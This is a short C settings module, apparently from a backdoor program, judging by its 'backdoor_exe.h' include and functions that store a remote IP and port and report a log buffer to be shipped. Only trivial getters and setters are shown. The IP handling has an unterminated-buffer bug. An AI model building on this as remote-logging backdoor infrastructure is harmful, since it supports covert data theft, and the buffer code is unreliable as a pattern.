#include "settings.h"
#include <backdoor_exe.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
char _ip[15];
int _port;
int _updated = 1;

void setPort(int port){
	_port = port;
}
int getPort(){
	return _port;
}
void setIP(const char *ip){
	strncpy(_ip,ip,15);
}
char *getIP(){
	char * ret = malloc(15);
	strcpy(ret,_ip);
	return ret;
}
int isUpdated(){
	return _updated;
}
int getLengthOfBuffer(){
	int ret =  shipLogBufLength();
	return ret;
}
void updated(int bol) {
	_updated = bol;
}
